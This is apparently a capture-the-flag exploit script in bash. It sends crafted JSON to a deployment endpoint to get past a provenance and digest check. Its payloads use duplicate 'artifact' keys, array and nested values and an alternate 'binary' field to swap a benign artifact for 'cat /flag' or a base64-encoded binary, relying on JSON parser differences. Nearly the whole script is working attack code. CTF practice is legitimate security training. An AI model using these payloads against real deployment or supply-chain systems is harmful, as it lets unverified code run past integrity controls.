#!/bin/bash
B=${1:-https://43ogqi66u63yzgpx.t.ctf.tg}
BEN=QUJD
DBEN=$(printf '%s' "$BEN" | sha256sum | cut -d' ' -f1)   # sha256("QUJD")
MAL_ELF=$(base64 -w0 flagrd 2>/dev/null)
post(){ echo ">>> $1"; curl -sk -X POST "$B/deploy" -H 'Content-Type: application/json' --data-raw "$2"; echo; echo; }

for L in 'cat /flag' "$MAL_ELF"; do
  tag="${L:0:16}"
  post "dupkey deploy=LAST  [$tag]"  "{\"artifact\":\"$BEN\",\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":\"$DBEN\"},\"artifact\":\"$L\"}"
  post "dupkey deploy=FIRST [$tag]"  "{\"artifact\":\"$L\",\"artifact\":\"$BEN\",\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":\"$DBEN\"}}"
done
post "artifact=array"        "{\"artifact\":[\"$BEN\",\"cat /flag\"],\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":\"$DBEN\"}}"
post "prov.artifact nested"  "{\"artifact\":\"$BEN\",\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":\"$DBEN\",\"artifact\":\"cat /flag\"}}"
post "digest=array both"     "{\"artifact\":\"cat /flag\",\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":[\"$DBEN\",\"$(printf 'cat /flag'|sha256sum|cut -d' ' -f1)\"]}}"
# swap via champ 'binary'/'payload' alternatif
post "champ binary alt"      "{\"artifact\":\"$BEN\",\"binary\":\"cat /flag\",\"provenance\":{\"builder\":\"trusted-builder\",\"digest\":\"$DBEN\"}}"
